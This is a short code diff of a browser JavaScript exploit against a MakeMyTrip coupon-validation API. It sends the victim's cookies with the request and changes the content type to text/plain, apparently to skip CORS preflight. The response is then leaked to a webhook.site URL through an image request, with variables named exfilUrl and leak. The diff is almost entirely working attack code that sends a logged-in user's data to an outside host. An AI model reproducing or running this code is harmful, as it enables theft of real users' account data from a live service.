@@ -3,7 +3,7 @@ fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?la
   method: "POST",
   credentials: "include",
   headers: {
-    "Content-Type": "application/json"
+    "Content-Type": "text/plain"
   },
   body: JSON.stringify({
     countryCode: "IN",
@@ -26,7 +26,7 @@ fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?la
 .then(body => {
   // encodeURIComponent to safely pass body as URL param
   let encoded = encodeURIComponent(body.slice(0, 2000)); // truncate to avoid URL length issues
-  let exfilUrl = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encoded;
+  let exfilUrl = "https://webhook.site/b1dea0eb-0f15-478b-8cc8-f42f6e2b7d23?leak=" + encoded;
 
   // Send via image to avoid CORS
   let img = new Image();
